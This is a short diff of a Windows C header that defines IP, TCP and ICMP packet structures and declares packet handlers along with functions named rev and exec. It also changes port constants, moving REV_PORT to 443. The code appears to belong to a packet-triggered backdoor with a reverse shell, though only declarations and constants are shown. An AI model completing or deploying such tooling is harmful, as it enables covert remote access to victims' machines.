@@ -1,6 +1,6 @@
 #pragma once
 
-#ifdef DEBUG
+#ifdef _DEBUG
 #include <errno.h>
 #include <stdio.h>
 #endif
@@ -9,12 +9,6 @@
 #include <mstcpip.h>
 
 #pragma comment(lib, "ws2_32.lib")
-
-
-struct sockaddr_in* GetIP();
-void rev(char*);
-void exec(char*);
-
 
 struct icmp_hdr_s {
 	uint8_t type;
@@ -43,7 +37,6 @@ struct tcp_hdr_s {
 	uint16_t 	th_urp;
 };
 
-
 struct ip_hdr_s {
 	uint8_t  	ip_hl : 4, ip_v : 4;
 	uint8_t   	ip_tos;
@@ -57,6 +50,15 @@ struct ip_hdr_s {
 	uint32_t 	ip_dst;
 };
 
+void handleTCP(char*, struct ip_hdr_s*);
+void handleUDP(char*, struct ip_hdr_s*);
+void handleICMP(char*, struct ip_hdr_s*);
+void compare(int, char*);
+void rev(char*);
+void exec(char*);
+struct sockaddr_in* GetIP();
+
+#define IP_HEADER_SIZE 20
 
 #define BUFFER_SIZE_PKT ((256*256) - 1)
 #define BUFFER_SIZE_ETH 14
@@ -73,8 +75,8 @@ struct ip_hdr_s {
 #define BUFFER_OFFSET_ICMP_DATA ( BUFFER_OFFSET_L4 + sizeof(struct icmp_hdr_s) )
 
 #define SRC_PORT 	6006
-#define SRC_PORT_2	8557 
-#define REV_PORT 	2628
+#define SRC_PORT_2	2628 
+#define REV_PORT 	443
 
 #define ICMP_REQ 	8
 #define ICMP_CODE	1
